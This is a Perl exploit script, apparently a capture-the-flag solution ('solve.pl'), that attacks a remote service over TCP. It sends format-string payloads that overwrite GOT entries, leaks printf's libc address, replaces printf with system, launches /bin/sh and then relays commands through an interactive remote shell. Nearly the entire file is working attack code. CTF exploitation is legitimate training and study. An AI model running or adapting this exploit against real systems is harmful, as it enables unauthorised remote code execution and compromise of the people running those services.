#!/usr/bin/perl

use strict;
use warnings;
use IO::Socket;
use MIME::Base64;

if (@ARGV != 2) {
	warn "Usage: ./solve.pl host port\n";
	exit 1;
}

my $libc_printf = 0x64e40;
my $libc_system = 0x4f420;

my $store_printf = 0x601030;
my $store_exit = 0x601058;

my $sock = new IO::Socket::INET(PeerAddr=>$ARGV[0], PeerPort=>int($ARGV[1]), Proto=>"tcp");
die "connect failed: $!\n" unless $sock;

print $sock "-1\n";
# retrieve address of printf and replace exit with main
# write 0x00000000 to  $store_exit + 4
# write 0x0040 to $store_exit + 2
# write 0x0837 to $store_exit + 0
my $payload1 = "%21\$n%64d%22\$hn%2039d%23\$hn====%24\$s====" . pack("QQQQQ",
	$store_exit + 4,
	$store_exit + 2,
	$store_exit + 0,
	$store_printf
) . "\n";
print $sock $payload1;

my $mem_printf = 0;
for (my $data = "";;) {
	my $line = <$sock>;
	die "communication error: $!\n" unless $line;
	$data .= $line;
	if ($data =~ /====(.*)====/) {
		$mem_printf = unpack("Q", substr($1 . ("\0" x 8), 0, 8));
		last;
	}
}
printf "printf = 0x%016x\n", $mem_printf;

my $mem_system = $mem_printf + $libc_system - $libc_printf;
printf "system = 0x%016x\n", $mem_system; 

if (($mem_system & ~0xffffff) != ($mem_printf & ~0xffffff)) {
	printf "large address mismatch, try again\n";
	close $sock;
	exit 1;
}

# replace printf with system
# "%999d%99$hhn" -> length 12
my $payload2 = "";
my $payload2_2 = "";
my $prev = 0;
for (my $i = 0; $i < 3; $i++) {
	my $cur = ($mem_system >> (8 * $i)) & 0xff;
	my $delta = ($cur - $prev) & 0xff;
	if ($delta != 0) { $payload2 .= sprintf("%%%dd", $delta); }
	$payload2 .= sprintf("%%%d\$hhn", 21 + $i);
	$payload2_2 .= pack("Q", $store_printf + $i);
	$prev = $cur;
}
print $sock "-1\n";
print $sock ($payload2 . ("x" x (40 - length($payload2))) . $payload2_2 . "\n");

# execute system("/bin/sh")
print $sock "-1\n";
print $sock "/bin/sh\0\n";

# check if the shell is being executed
my $check = "meowmeowmeowmeowmeow";
print $sock "echo $check\n";
for (;;) {
	my $line = <$sock>;
	die "communication error: $!\n" unless $line;
	if (index($line, $check) >= 0) {
		last;
	}
}

print "entering pseudo-interactive shell!\n";
for (;;) {
	my $command = <STDIN>;
	chomp($command);
	if ($command eq "exit") { last; }
	if ($command eq "") { next; }
	print $sock "$command | base64 -w 99999999\n";
	my $res = <$sock>;
	die "communication error: $!\n" unless $res;
	print decode_base64($res);
}

close $sock;
